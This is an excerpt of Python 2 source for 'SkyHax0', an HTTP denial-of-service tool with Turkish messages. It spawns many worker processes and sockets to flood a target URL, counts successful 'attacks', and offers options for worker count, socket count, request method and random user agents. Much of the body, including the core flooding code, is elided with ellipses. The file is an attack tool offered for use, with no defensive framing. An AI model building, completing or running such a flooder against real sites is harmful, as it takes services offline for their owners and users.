...
SKYHAX_BANNER = 'SkyHax0 DoS Software v1.0'
...
class SkyHax0(object):
    ...
    def fire(self):
        ...
        self.printHeader()
        print "Sunucu Saldırma Modu : '{0}' | {1} Worker Çalışıyor | {2} Bağlantı Var. CTRL + C yaparak Durdur.".format(self.method, self.nr_workers, self.nr_sockets)

        if DEBUG:
            print "{0} Eş Zamanlı Çalışan Bağlatılıyor".format(self.nr_workers)
        ...
        for i in range(int(self.nr_workers)):
            ...
            try:
                ...
                error("Worker Başlatılamadı | Sayı : {0}".format(i))
                pass 

        if DEBUG:
            print "Monitör Başlatılıyor"
        self.monitor()
    ...
    def stats(self):
        ...
        try:
            if self.counter[0] > 0 or self.counter[1] > 0:
                ...
                print "{0} Saldırı Ulaştı. ({1} Başarısız)".format(self.counter[0], self.counter[1])
    ...
    def monitor(self):
        while len(self.workersQueue) > 0:
            try:
                ...
                print "CTRL+C Algılandı. Worker'ler Öldürülüyor"
                for worker in self.workersQueue:
                    try:
                        if DEBUG:
                            print "Workerler Bitirildi {0}".format(worker.name)
                        #worker.terminate()
                        worker.stop()
                    except Exception, ex:
                        pass 
...
class Striker(Process):
    ...
    def run(self):
        ...
        if DEBUG:
            print "{0} Worker Başlatılıyor".format(self.name)
        ...
        if DEBUG:
            print "{0} Worker Çalışmayı Bitirdi. Uyku Moduna Geçiyor...".format(self.name)
...
def usage():
    ...
    print SKYHAX_BANNER
    print 
    print ' Kullanım : ./skydos.py <url> [OPTIONS]'
    print
    print ' Ayarlar:'
    print '\t Flag\t\t\tDescription\t\t\t\t\t\tVarsayılan'
    print '\t -u, --useragents\tuser-agents Ayarları\t\t\t\t(Varsayılan: Rasgele Geliştiriliyor.)'
    print '\t -w, --workers\t\tEş Zamanlı Worker Sayısı\t\t\t\t(default: {0})'.format(DEFAULT_WORKERS)
    print '\t -s, --soket\t\tEş Zamanlı Çalışan Soket Sayısı\t\t\t\t(default: {0})'.format(DEFAULT_SOCKETS)
    print '\t -m, --method\t\tHttp Methodu Kullanır \'get\' - \'post\'  - \'random\'\t\t(Varsayılan: get)'
    print '\t -d, --debug\t\tDebug Modunu Açar [Daha Detaylı Çıkış]\t\t\t(default: False)'
    print '\t -y, --yardim\t\tProgram Komutlarını Gösterir'
    print
    print '-----------------------------------------------------------------------------------------------------------'
...
def main():
    ...
    try:
        ...
        if url[0:4].lower() != 'http':
            error("Bilinmeyen URL Tanımlaması")

        if url == None:
            error("URL Tanımlanmadı")
        ...
        for o, a in opts:
            if o in ("-y", "--yardim"):
                ...
                if a in (METHOD_GET, METHOD_POST, METHOD_RAND):
                    ...
                    error("Method {0} Bulunamadı".format(a))
            else:
                error("Seçenek : '"+o+"' Girilebilir Seçenekler Arasında Değil.")
        ...
        if uas_file:
            try:
                with open(uas_file) as f:
                    ...
                    error("Okunamayan Dosya {0}".format(uas_file))

        skyhax = SkyHax0(url)
        skyhax.useragents = useragents
        skyhax.nr_workers = workers
        skyhax.method = method
        skyhax.nr_sockets = socks
